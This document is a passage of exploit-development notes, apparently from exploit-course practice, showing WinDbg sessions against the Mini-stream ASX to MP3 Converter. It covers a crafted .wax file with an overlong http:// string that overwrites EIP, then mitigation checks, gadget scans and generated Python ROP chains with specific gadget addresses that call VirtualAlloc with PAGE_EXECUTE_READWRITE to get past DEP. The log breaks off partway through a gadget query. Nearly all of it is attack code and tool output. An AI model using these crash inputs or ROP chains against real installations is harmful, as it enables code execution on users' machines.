## File load .wax

Crafted a file with http://A*20000

```text
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00102ebc ecx=41414141 edx=03e40000 esi=00102eef edi=00000000
eip=41414141 esp=000fc480 ebp=00103384 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206
41414141 ??              ???
```

```text
0:000> dx @$osed().triage()

=== CONTROL ===
EIP controlled: yes
Offset: n/a
Pattern: n/a

=== SEH ===
Overwritten: no
Next SEH: n/a
Handler: n/a
Status: SEH chain is empty.

=== STACK ===
esp: 0x000FC480
Bad stack pointer: no
SP points into cyclic pattern: no
Stack protect: PAGE_READWRITE
DEP enforced: yes
Shellcode candidates: none

=== GADGETS ===
JMP ESP:
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll+0x2B95A
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll+0x314E7
  C:\Windows\system32\wpdshext.dll+0xA548
  C:\Windows\system32\wpdshext.dll+0x7407F
  C:\Windows\system32\wpdshext.dll+0x74193
CALL ESP:
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll+0x371F5
  C:\Windows\system32\wpdshext.dll+0x75D7F
  C:\Windows\system32\wpdshext.dll+0x76143
  C:\Windows\WinSxS\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.6456_none_d950d087e104e52a\gdiplus.dll+0x3F9D
  C:\Windows\WinSxS\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.6456_none_d950d087e104e52a\gdiplus.dll+0xCBAF
POP POP RET:
  C:\Windows\system32\d3d11.dll+0x5C834
  C:\Windows\System32\KERNELBASE.dll+0x1BA2DD
  C:\Windows\System32\ADVAPI32.dll+0x25385
  C:\Windows\System32\combase.dll+0xE0E00
  C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.6280_none_c0dab36c38bfeda0\COMCTL32.dll+0x50C23
Stack pivots:
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x87FC
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x8C14
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x8C51
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x9923
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0xC0A3

=== CONTEXT ===
Exception code: n/a
eip: 0x41414141

=== MODULE SCORE ===
Module                                                                  Score   ASLR      NX_COMPAT   SafeSEH   System  
----------------------------------------------------------------------  ------  --------  ----------  --------  --------
C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe  100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mcodec02.dll      100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mctn01.dll        100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\msvos.dll             100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter02.dll     100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSLog.dll             100     disabled  disabled    disabled  no      

=== BADCHAR QUICK SCAN ===
Byte      Count   FirstOff
--------  ------  --------
0x00      0       n/a     
0x0A      0       n/a     
0x0D      0       n/a     
@$osed().triage() : true
```

Control of EIP and DEP on due to system configuration


```txt
0:000> dx @$osed().sc.iat_ptr("MSA2Mfilter03.dll","VirtualAlloc")

=== sc.iat_ptr ===
slot        target      module        symbol        status  note
----------  ----------  ------------  ------------  ------  ----
0x1005D060  0x76E25680  KERNEL32.DLL  VirtualAlloc  ok          
@$osed().sc.iat_ptr("MSA2Mfilter03.dll","VirtualAlloc")                 : sc.iat_ptr: 1 row
    title            : sc.iat_ptr
    rows             : sc.iat_ptr: 1 row; expand rows[N] for details
    length           : 0x1

0:000> dx @$osed().sc.iat_ptr("MSA2Mfilter01.dll","VirtualAlloc")

=== sc.iat_ptr ===
slot       target      module        symbol        status  note
---------  ----------  ------------  ------------  ------  ----
0x3E8D108  0x76E25680  KERNEL32.DLL  VirtualAlloc  ok          
@$osed().sc.iat_ptr("MSA2Mfilter01.dll","VirtualAlloc")                 : sc.iat_ptr: 1 row
    title            : sc.iat_ptr
    rows             : sc.iat_ptr: 1 row; expand rows[N] for details
    length           : 0x1

```

```powershell
 uv run peinfo 'C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll'
╭─────────────────────────────────────────────────── PE Information ───────────────────────────────────────────────────╮
│   File                      C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll                      │
│   Size                      499,712 bytes                                                                            │
│   Machine                   x86 (I386)                                                                               │
│   Subsystem                 Windows GUI                                                                              │
│   Compiler Timestamp        2010-03-30 14:02:01 UTC                                                                  │
│   Linker Version            6.0                                                                                      │
│   Checksum                  0x00000000                                                                               │
│   Characteristics           0x210E                                                                                   │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─────────────────────────────────────────────────── PE Mitigations ───────────────────────────────────────────────────╮
│   DllCharacteristics        0x0000                                                                                   │
│                                                                                                                      │
│   NX_COMPAT                 No                                                                                       │
│   DYNAMIC_BASE (ASLR)       No                                                                                       │
│   HIGH_ENTROPY_VA           No                                                                                       │
│   FORCE_INTEGRITY           No                                                                                       │
│   NO_SEH                    No                                                                                       │
│   GUARD_CF (CFG)            No                                                                                       │
│   TERMINAL_SERVER_AWARE     No                                                                                       │
│   APP_CONTAINER             No                                                                                       │
│   NO_BIND                   No                                                                                       │
│   NO_ISOLATION              No                                                                                       │
│                                                                                                                      │
│   Relocations Present       Yes                                                                                      │
│   GS Security Cookie        No                                                                                       │
│   SafeSEH                   No                                                                                       │
╰───────────────────────────────────────────── compile-time / static only ─────────────────────────────────────────────╯
╭─────────────────────────────────────────────────── Memory Layout ────────────────────────────────────────────────────╮
│   Image Base                0x10000000                                                                               │
│   Entry Point               0x10029E34                                                                               │
│   Image Size                0x8D000                                                                                  │
│   Section Alignment         0x1000                                                                                   │
│   File Alignment            0x1000                                                                                   │
│   Stack Reserve             0x100000                                                                                 │
│   Stack Commit              0x1000                                                                                   │
│   Heap Reserve              0x100000                                                                                 │
│   Heap Commit               0x1000                                                                                   │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭────────────────────────────────────────────────────── Sections ──────────────────────────────────────────────────────╮
│  Name      VirtAddr  VirtSize      RawOff  RawSize  Entropy  Perms                                                   │
│  .text   0x00001000   0x5B50A  0x00001000  0x5C000     6.62  R-X                                                     │
│  .rdata  0x0005D000    0x8027  0x0005D000   0x9000     5.25  R--                                                     │
│  .data   0x00066000   0x22D9C  0x00066000  0x10000     4.46  RW-                                                     │
│  .reloc  0x00089000    0x3CA2  0x00076000   0x4000     6.12  R--                                                     │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─────────────────────────────────────────────────── Imported DLLs ────────────────────────────────────────────────────╮
│   KERNEL32.dll    68 functions                                                                                       │
│   ADVAPI32.dll     3 functions                                                                                       │
│   WS2_32.dll      20 functions                                                                                       │
│   WINMM.dll        3 functions                                                                                       │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭────────────────────────────────────────────────── Interesting APIs ──────────────────────────────────────────────────╮
│   Exploitation APIs     GetProcAddress, HeapAlloc, HeapCreate, HeapFree, LoadLibraryA, VirtualAlloc                  │
│   Networking            WSAStartup, bind, connect, recv, send, socket                                                │
│   Registry              RegOpenKeyExA, RegQueryValueExA                                                              │
│   Process               TerminateProcess                                                                             │
│   File I/O              CreateFileA, ReadFile, SetFilePointer, WriteFile                                             │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭──────────────────────────────────────────────── Interesting Strings ─────────────────────────────────────────────────╮
│   user32.dll                                                                                                         │
│   Registration Descriptor length too short: %d, SKIPPING                                                             │
│   Registration Descriptor                                                                                            │
│   .bat                                                                                                               │
│   .exe                                                                                                               │
│   KERNEL32.dll                                                                                                       │
│   ADVAPI32.dll                                                                                                       │
│   USER32.dll                                                                                                         │
│   WS2_32.dll                                                                                                         │
│   WINMM.dll                                                                                                          │
│   MSA2Mfilter03.dll                                                                                                  │
│   Option %s: Error while setting password.                                                                           │
│   Option %s: This URL doesn't have a password part.                                                                  │
│   password                                                                                                           │
│   http://www.bbc.co.uk/iplayer/playlist/                                                                             │
│   http://                                                                                                            │
│   http://www.bbc.co.uk/mediaselector/4/mtis/stream/                                                                  │
│   Debug: Playlist_Create ok. %s(%u)                                                                                  │
│   Debug: Playlist_Create enter. %s(%u)                                                                               │
│   Debug: Playlist_Destroy ok. %s(%u)                                                                                 │
│   Debug: Playlist_Destroy enter. %s(%u)                                                                              │
│   Debug: Playlist_FindNextItem NO File return. %s(%u)                                                                │
│   Debug: Playlist_FindNextItem ok. %s(%u)                                                                            │
│   Debug: Playlist_FindNextItem enter. %s(%u)                                                                         │
│   Debug: Stream_Create ok. %s(%u)                                                                                    │
│   Debug: Stream_Create enter. %s(%u)                                                                                 │
│   --- HTTP DEBUG HEADER --- END ---                                                                                  │
│   --- HTTP DEBUG HEADER --- START ---                                                                                │
│   http://player.xmradio.com                                                                                          │
│   Using HTTP proxy: http://%s:%d                                                                                     │
│   Authentication failed. Please use the -user and -passwd options to provide your                                    │
│   username/password for a list of URLs, or form an URL like:                                                         │
│   http://username:password@hostname/file                                                                             │
│   No password provided, trying blank password.                                                                       │
│   Referer: http://www.vtuner.com/vtunerweb/asp/SearchR3.asp?search=N-JOY                                             │
│   MPF_DEBUG_TRACE(wm_get_rdt_chunk): ts: %u, size: %u, flags: 0x%02x, seq number: 0x%06x 0x%02x 0x%02x               │
│   MPF_DEBUG_TRACE(describe reply): <X-Playlist-Gen-Id>:%u                                                            │
│   Debug(sdp msg): '%s'                                                                                               │
╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
╭─────────────────────────────────────────────── Gadget Pre-Enumeration ───────────────────────────────────────────────╮
│   RET                       2452                                                                                     │
│   POP r32; RET              1168                                                                                     │
│   POP r32; POP r32; RET      475                                                                                     │
│   JMP ESP                      0                                                                                     │
│   CALL ESP                     1                                                                                     │
│   CALL EAX                    23                                                                                     │
│   CALL ECX                     5                                                                                     │
│   CALL EDX                     1                                                                                     │
│   CALL EBX                     6                                                                                     │
│   CALL ESI                    17                                                                                     │
│   CALL EDI                    13                                                                                     │
│   CALL EBP                    15                                                                                     │
│   PUSH ESP; RET                0                                                                                     │
│   PUSHAD; RET                  1                                                                                     │
│   XCHG EAX, ESP; RET           1                                                                                     │
│   ADD ESP, imm; RET          551                                                                                     │
╰──────────────────────────────────── byte-pattern matches in executable sections ─────────────────────────────────────╯
╭─────────────────────────────────────────────── Exploitability Summary ───────────────────────────────────────────────╮
│   Excellent ROP Candidate: YES                                                                                       │
│                                                                                                                      │
│   Favorable:                                                                                                         │
│     * Fixed image base (no ASLR/DYNAMIC_BASE)                                                                        │
│     * NX_COMPAT absent                                                                                               │
│     * No SafeSEH                                                                                                     │
│     * No CFG                                                                                                         │
│     * No GS security cookie                                                                                          │
│     * 2452 RET gadgets                                                                                               │
│     * Imports VirtualAlloc                                                                                           │
╰─────────────────────────────── static analysis only -- runtime mitigations may differ ───────────────────────────────╯
```

```text
0:000> dx @$osed().rop.scan_live("MSA2Mfilter03.dll", "00 0A 0D")

=== Module Scan ===
[+] MSA2Mfilter03.dll: 171 raw gadgets accepted, 463 rejected

=== Corpus Summary ===
[+] Mode: replace
[+] Modules: MSA2Mfilter03.dll
[+] Semantic gadgets: 53 (deduplicated)
[+] Capabilities: 60
@$osed().rop.scan_live("MSA2Mfilter03.dll", "00 0A 0D")                 : Live ROP Corpus: 2 rows
    title            : Live ROP Corpus
    rows             : Live ROP Corpus: 2 rows; expand rows[N] for details
    length           : 0x2
0:000> dx @$osed().rop.plan("VirtualAlloc")

=== ROP Plan 1: VirtualAlloc ===
Plan  Strategy      Shape                    Possible  Feasibility              Recommended  Complexity  Required                               Satisfied                              Missing  Preconditions                                                                                                                                                                                                                                                               Reason                                                                          
----  ------------  -----------------------  --------  -----------------------  -----------  ----------  -------------------------------------  -------------------------------------  -------  --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  --------------------------------------------------------------------------------
1     VirtualAlloc  SYNTHETIC_STDCALL_FRAME  yes       exploit-state-dependent  yes          LOW         DISPATCH_RET                           DISPATCH_RET                                    EIP is controlled (e.g. via SEH overwrite or saved return address). | ESP points to or can reach a region with 24+ contiguous controlled bytes. | VirtualAlloc address is known or resolvable at exploit time. | All frame values are encodable under the current charset.  All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualAlloc  STACK_PIVOT_FRAME        yes       exploit-state-dependent               LOW         STACK_PIVOT, DISPATCH_RET              STACK_PIVOT, DISPATCH_RET                       A controlled, writable memory region can hold the synthetic frame. | The pivot source register or memory contains a valid pointer to the controlled region. | VirtualAlloc address is known or resolvable at exploit time.                                                  All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualAlloc  RET_DISPATCH             yes       exploit-state-dependent               LOW         DISPATCH_RET                           DISPATCH_RET                                    ESP points to a controlled region large enough for the stdcall frame. | VirtualAlloc address is encodable and placed at ESP when ret executes. | Stdcall arguments follow the API address on the stack.                                                                     All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualAlloc  PUSHAD_DISPATCH          yes       exploit-state-dependent               MEDIUM      LOAD_CONSTANT, DISPATCH_PUSHAD         LOAD_CONSTANT, DISPATCH_PUSHAD                  Registers can be loaded with the required API arguments via pop gadgets. | The PUSHAD stack layout matches the VirtualAlloc stdcall ABI. | ESP at pushad time points into the shellcode or NOP sled (used as lpAddress).                                                    All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualAlloc  CALL_REGISTER            yes       exploit-state-dependent               HIGH        LOAD_CONSTANT, DISPATCH_CALL_REGISTER  LOAD_CONSTANT, DISPATCH_CALL_REGISTER           The API address must be loaded into the dispatch register before call. | A valid stdcall frame for VirtualAlloc must exist at [ESP] when call executes (return addr is pushed by call). | The call target must not clobber registers or stack state needed by the API.      All required capabilities present. Exploit-state preconditions must be verified.
1     VirtualAlloc  JMP_REGISTER             yes       exploit-state-dependent               HIGH        LOAD_CONSTANT, DISPATCH_JMP_REGISTER   LOAD_CONSTANT, DISPATCH_JMP_REGISTER            The API address must be loaded into the dispatch register before jmp. | ESP must point to: [RETURN_ADDR][arg1][arg2]... since jmp does not push a return address. | The full VirtualAlloc stdcall frame must already be on the stack.                                       All required capabilities present. Exploit-state preconditions must be verified.
@$osed().rop.plan("VirtualAlloc")                 : ROP Plan 1: 6 rows
    title            : ROP Plan 1
    rows             : ROP Plan 1: 6 rows; expand rows[N] for details
    length           : 0x6
```

```text
0:000> dx @$osed().triage(8000, "00 0A 0D")

=== CONTROL ===
EIP controlled: yes
Offset: n/a
Pattern: n/a

=== SEH ===
Overwritten: no
Next SEH: n/a
Handler: n/a
Status: SEH chain is empty.

=== STACK ===
esp: 0x000FC480
Bad stack pointer: no
SP points into cyclic pattern: no
Stack protect: PAGE_READWRITE
DEP enforced: yes
Shellcode candidates: none

=== GADGETS ===
JMP ESP:
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll+0x2B95A
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter01.dll+0x314E7
  C:\Windows\system32\wpdshext.dll+0xA548
  C:\Windows\system32\wpdshext.dll+0x7407F
  C:\Windows\system32\wpdshext.dll+0x74193
CALL ESP:
  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll+0x371F5
  C:\Windows\system32\wpdshext.dll+0x75D7F
  C:\Windows\system32\wpdshext.dll+0x76143
  C:\Windows\WinSxS\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.6456_none_d950d087e104e52a\gdiplus.dll+0x3F9D
  C:\Windows\WinSxS\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.6456_none_d950d087e104e52a\gdiplus.dll+0xCBAF
POP POP RET:
  C:\Windows\system32\d3d11.dll+0x5C834
  C:\Windows\System32\KERNELBASE.dll+0x1BA2DD
  C:\Windows\System32\ADVAPI32.dll+0x25385
  C:\Windows\System32\combase.dll+0xE0E00
  C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.6280_none_c0dab36c38bfeda0\COMCTL32.dll+0x50C23
Stack pivots:
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x87FC
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x8C14
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x8C51
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0x9923
  C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe+0xC0A3

=== CONTEXT ===
Exception code: n/a
eip: 0x41414141

=== MODULE SCORE ===
Module                                                                  Score   ASLR      NX_COMPAT   SafeSEH   System  
----------------------------------------------------------------------  ------  --------  ----------  --------  --------
C:\Program Files\Mini-stream\ASX to MP3 Converter\ASX2MP3Converter.exe  100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mcodec02.dll      100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mctn01.dll        100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\msvos.dll             100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter02.dll     100     disabled  disabled    disabled  no      
C:\Program Files\Mini-stream\ASX to MP3 Converter\MSLog.dll             100     disabled  disabled    disabled  no      

=== BADCHAR QUICK SCAN ===
Byte      Count   FirstOff
--------  ------  --------
0x00      0       n/a     
0x0A      0       n/a     
0x0D      0       n/a     
@$osed().triage(8000, "00 0A 0D") : true
```


```text
0:000> dx @$osed().rop.emit(1)

=== ROP Emit 1.1 ===
Plan  Strategy                                Capability    Address     Module                                                               Sequence       Score  StackDelta  SideEffects
----  --------------------------------------  ------------  ----------  -------------------------------------------------------------------  -------------  -----  ----------  -----------
1     VirtualAlloc / SYNTHETIC_STDCALL_FRAME  DISPATCH_RET  0x1002E5ED  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  inc esp ; ret  85     4           1          
@$osed().rop.emit(1)                 : ROP Emit 1.1: 1 row
    title            : ROP Emit 1.1
    rows             : ROP Emit 1.1: 1 row; expand rows[N] for details
    length           : 0x1
0:000> dx @$osed().rop.synthesize(1)

=== ROP Synthesize 1 ===
[+] Path: DIRECT_API
[+] Status: complete-with-violations
[+] Layout: produced
[+] Constraint compatible: no
[+] Strategy: VirtualAlloc / SYNTHETIC_STDCALL_FRAME
[+] Total: 24 bytes
[+] Resolve before use: VIRTUALALLOC, RETURN_ADDR, LP_ADDRESS
[!] VIOLATION: dwSize: 0x00000201 contains badchar byte(s) 0x00.
[!] VIOLATION: flAllocationType = MEM_COMMIT: 0x00001000 contains badchar byte(s) 0x00.
[!] VIOLATION: flProtect = PAGE_EXECUTE_READWRITE: 0x00000040 contains badchar byte(s) 0x00.
[!] RETURN_ADDR: placeholder value must be checked against badchars after resolution.
[!] LP_ADDRESS: placeholder value must be checked against badchars after resolution.
[!] VIRTUALALLOC: saved EIP must contain the API address; check against badchars after resolution.
[+] Operator action: synthesize values arithmetically, use writable memory construction, or select an alternate strategy.

=== ROP Synthesize 1 ===
Plan  Strategy                                Status                    Path        Layout    Compatible  Offset  Role                   Word          Comment                                      Diagnostic  Detail                                                                       
----  --------------------------------------  ------------------------  ----------  --------  ----------  ------  ---------------------  ------------  -------------------------------------------  ----------  -----------------------------------------------------------------------------
1     VirtualAlloc / SYNTHETIC_STDCALL_FRAME  complete-with-violations  DIRECT_API  produced  no                                                                                                                                                                                             
                                                                                                          -4      saved-eip              VIRTUALALLOC  saved EIP = VirtualAlloc (direct overwrite)                                                                                           
                                                                                                          +0      return-address         RETURN_ADDR   return address                                                                                                                        
                                                                                                          +4      arg1-lpAddress         LP_ADDRESS    lpAddress                                                                                                                             
                                                                                                          +8      arg2-dwSize            0x00000201    dwSize                                                                                                                                
                                                                                                          +12     arg3-flAllocationType  0x00001000    flAllocationType = MEM_COMMIT                                                                                                         
                                                                                                          +16     arg4-flProtect         0x00000040    flProtect = PAGE_EXECUTE_READWRITE                                                                                                    
                                                                                                                                                                                                    VIOLATION   dwSize: 0x00000201 contains badchar byte(s) 0x00.                            
                                                                                                                                                                                                    VIOLATION   flAllocationType = MEM_COMMIT: 0x00001000 contains badchar byte(s) 0x00.     
                                                                                                                                                                                                    VIOLATION   flProtect = PAGE_EXECUTE_READWRITE: 0x00000040 contains badchar byte(s) 0x00.
@$osed().rop.synthesize(1)                 : ROP Synthesize 1: 10 rows
    title            : ROP Synthesize 1
    rows             : ROP Synthesize 1: 10 rows; expand rows[N] for details
    length           : 0xa
0:000> dx @$osed().rop.export(1)

=== ROP Export 1 ===
#!/usr/bin/env python3
# osed-windbg ROP export — plan 1: VirtualAlloc / SYNTHETIC_STDCALL_FRAME
#
# Stack layout for plan 1: VirtualAlloc / SYNTHETIC_STDCALL_FRAME
# Entry path: DIRECT_API
# Status: complete-with-violations
# TODO: resolve placeholders: VIRTUALALLOC, RETURN_ADDR, LP_ADDRESS
# WARNING: dwSize: 0x00000201 contains badchar byte(s) 0x00.
# WARNING: flAllocationType = MEM_COMMIT: 0x00001000 contains badchar byte(s) 0x00.
# WARNING: flProtect = PAGE_EXECUTE_READWRITE: 0x00000040 contains badchar byte(s) 0x00.

from struct import pack
payload = b""
payload += pack("<I", VIRTUALALLOC)  # [-4] saved-eip: saved EIP = VirtualAlloc (direct overwrite)
payload += pack("<I", RETURN_ADDR)  # [+0] return-address: return address
payload += pack("<I", LP_ADDRESS)  # [+4] arg1-lpAddress: lpAddress
payload += pack("<I", 0x00000201)  # [+8] arg2-dwSize: dwSize
payload += pack("<I", 0x00001000)  # [+12] arg3-flAllocationType: flAllocationType = MEM_COMMIT
payload += pack("<I", 0x00000040)  # [+16] arg4-flProtect: flProtect = PAGE_EXECUTE_READWRITE


=== ROP Export 1 ===
Plan  Strategy                                Gadgets  Layout   File     
----  --------------------------------------  -------  -------  ---------
1     VirtualAlloc / SYNTHETIC_STDCALL_FRAME  1        6 slots  (console)
@$osed().rop.export(1)                 : ROP Export 1: 1 row
    title            : ROP Export 1
    rows             : ROP Export 1: 1 row; expand rows[N] for details
    length           : 0x1
```

```text
0:000> dx @$osed().rop.capabilities()

=== ROP Capabilities ===
Kind                    Register  Target  Count
----------------------  --------  ------  -----
DISPATCH_CALL_MEMORY                      4    
DISPATCH_CALL_REGISTER  eax               1    
DISPATCH_CALL_REGISTER  ebp               1    
DISPATCH_CALL_REGISTER  ebx               1    
DISPATCH_CALL_REGISTER  edi               1    
DISPATCH_CALL_REGISTER  edx               1    
DISPATCH_CALL_REGISTER  esi               1    
DISPATCH_CALL_REGISTER  esp               1    
DISPATCH_JMP_REGISTER   eax               1    
DISPATCH_PUSHAD                           1    
DISPATCH_RET                              41   
EXCHANGE_REGISTER       eax       esp     1    
LOAD_CONSTANT           eax               4    
LOAD_CONSTANT           ebp               7    
LOAD_CONSTANT           ebx               6    
LOAD_CONSTANT           ecx               6    
LOAD_CONSTANT           edi               5    
LOAD_CONSTANT           edx               1    
LOAD_CONSTANT           esi               6    
LOAD_CONSTANT           esp               1    
LOAD_MEMORY             eax               1    
LOAD_REGISTER           eax               4    
LOAD_REGISTER           ebp               7    
LOAD_REGISTER           ebx               6    
LOAD_REGISTER           ecx               6    
LOAD_REGISTER           edi               5    
LOAD_REGISTER           edx               1    
LOAD_REGISTER           esi               6    
LOAD_REGISTER           esp               1    
MEMORY_READ             eax               1    
MEMORY_WRITE            eax               1    
MEMORY_WRITE            ecx               2    
MEMORY_WRITE            edx               1    
REGISTER_ADD            esp       0x10    1    
REGISTER_ADD            esp       0x14    1    
REGISTER_ADD            esp       0x20    1    
REGISTER_ADD            esp       0x24    1    
REGISTER_ADD            esp       0x28    1    
REGISTER_ADD            esp       0x2c    1    
REGISTER_ADD            esp       0x4     1    
REGISTER_ADD            esp       0xc     1    
REGISTER_DECREMENT      esp               1    
REGISTER_INCREMENT      eax               1    
REGISTER_INCREMENT      esp               1    
REGISTER_NEGATE         eax               1    
REGISTER_SWAP           eax       esp     1    
STACK_ADJUST                              8    
STACK_PIVOT                               2    
STACK_READ              eax               4    
STACK_READ              ebp               7    
STACK_READ              ebx               6    
STACK_READ              ecx               6    
STACK_READ              edi               5    
STACK_READ              edx               1    
STACK_READ              esi               6    
STACK_READ              esp               1    
STACK_WRITE                               1    
STORE_MEMORY            eax               1    
STORE_MEMORY            ecx               2    
STORE_MEMORY            edx               1    
@$osed().rop.capabilities()                 : ROP Capabilities: 60 rows
    title            : ROP Capabilities
    rows             : ROP Capabilities: 60 rows; expand rows[N] for details
    length           : 0x3c
```

```text
0:000> dx @$osed().rop.chain_va()

=== ROP Chain — VirtualAlloc (PUSHAD) ===
[+] Mode: direct | Resolved gadgets: edi, ebp, edx, eax | Stack: 36 bytes
[+] Define before use: VIRTUALALLOC, LP_ADDRESS
from struct import pack
rop = b""
rop += pack("<I", 0x10012444)  # pop edi ; ret
rop += pack("<I", VIRTUALALLOC)  # edi = VIRTUALALLOC (VirtualAlloc (RET dispatches here))
rop += pack("<I", 0x1001062D)  # pop ebp ; ret
rop += pack("<I", LP_ADDRESS)  # ebp = LP_ADDRESS (lpAddress (NULL = OS chooses, or specific address))
rop += pack("<I", 0x10029697)  # pop edx ; ret
rop += pack("<I", 0x00000040)  # edx = 0x00000040 (flProtect = 0x00000040 (PAGE_EXECUTE_READWRITE))
rop += pack("<I", 0x1002A649)  # pop eax ; ret
rop += pack("<I", 0x90909090)  # eax = 0x90909090 (unused by VirtualAlloc (junk))
rop += pack("<I", 0x10014720)  # pushad ; ret (builds the VirtualAlloc call frame and dispatches)
[!] esi: only multi-pop or address-less load gadgets available
[!] ebx: only multi-pop or address-less load gadgets available
[!] ecx: only multi-pop or address-less load gadgets available
[!] direct PUSHAD VirtualAlloc uses saved ESP as dwSize; verify this size is acceptable or use a different chain shape.

=== ROP Chain — VirtualAlloc (PUSHAD) ===
Word          Meaning                                                              
------------  ---------------------------------------------------------------------
0x10012444    pop edi ; ret                                                        
VIRTUALALLOC  edi = VIRTUALALLOC (VirtualAlloc (RET dispatches here))              
0x1001062D    pop ebp ; ret                                                        
LP_ADDRESS    ebp = LP_ADDRESS (lpAddress (NULL = OS chooses, or specific address))
0x10029697    pop edx ; ret                                                        
0x00000040    edx = 0x00000040 (flProtect = 0x00000040 (PAGE_EXECUTE_READWRITE))   
0x1002A649    pop eax ; ret                                                        
0x90909090    eax = 0x90909090 (unused by VirtualAlloc (junk))                     
0x10014720    pushad ; ret (builds the VirtualAlloc call frame and dispatches)     
@$osed().rop.chain_va()                 : ROP Chain — VirtualAlloc (PUSHAD): 9 rows
    title            : ROP Chain — VirtualAlloc (PUSHAD)
    rows             : ROP Chain — VirtualAlloc (PUSHAD): 9 rows; expand rows[N] for details
    length           : 0x9
```

```text
0:000> dx @$osed().rop.query("writes", "edx")



=== ROP Query ===

Address     Module                                                               Score  Terminator  Reads             Writes                 MemoryReads         MemoryWrites  StackDelta      Capabilities                                            Sequence     

----------  -------------------------------------------------------------------  -----  ----------  ----------------  ---------------------  ------------------  ------------  --------------  ------------------------------------------------------  -------------

0x10029697  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edx, esp)  exact(exact=[esp])  none          exact(exact=8)  LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET  pop edx ; ret

@$osed().rop.query("writes", "edx")                 : ROP Query: 1 row

    title            : ROP Query

    rows             : ROP Query: 1 row; expand rows[N] for details

    length           : 0x1

0:000> dx @$osed().rop.query("capability", "LOAD_REGISTER", "ebx")



=== ROP Query ===

Address     Module                                                               Score  Terminator  Reads             Writes                      MemoryReads         MemoryWrites  StackDelta       Capabilities                                                                                      Sequence               

----------  -------------------------------------------------------------------  -----  ----------  ----------------  --------------------------  ------------------  ------------  ---------------  ------------------------------------------------------------------------------------------------  -----------------------

0x1002A649  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=eax, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop eax ; ret          

0x10029697  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  85     RETURN      exact(exact=esp)  exact(exact=edx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop edx ; ret          

0x10018B89  C:\Program Files\Mini-stream\ASX to MP3 Converter\MSA2Mfilter03.dll  70     RETURN      exact(exact=esp)  exact(exact=esp)            exact(exact=[esp])  none          unknown          LOAD_REGISTER, LOAD_CONSTANT, STACK_READ, DISPATCH_RET                                            pop esp ; ret          

